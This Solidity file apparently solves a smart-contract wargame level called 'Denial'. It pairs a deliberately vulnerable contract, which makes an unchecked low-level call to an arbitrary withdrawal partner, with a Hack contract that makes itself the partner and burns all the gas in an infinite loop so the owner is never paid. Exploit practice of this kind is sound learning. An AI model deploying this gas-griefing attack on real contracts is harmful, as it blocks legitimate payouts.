// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    // Set partner function
    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        // The call() returns (1) a bool success and (2) a bytes memory data which contains the return value.
        
        // Prevent owner to withdraw: create a contract with a fallback or receive function and 
        // drain all the gas to prevent further execution of the withdraw() functio
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}



contract Hack {
    
    Denial public hack; // Create instance from Denial

    // Deploy Hack contract, with CA from Denial
    constructor (address payable _denialAddress)  {
        hack = Denial(_denialAddress);
    }


    // Call setWithdrawPartner to make Hack a partner
    function setAsPartner() public {
        hack.setWithdrawPartner(address(this));
    }


    // receive function that drains all the gas and prevents further execution of the withdraw() function.
    // infinite loop:
    receive() external payable {
        while (true) {}
    }
}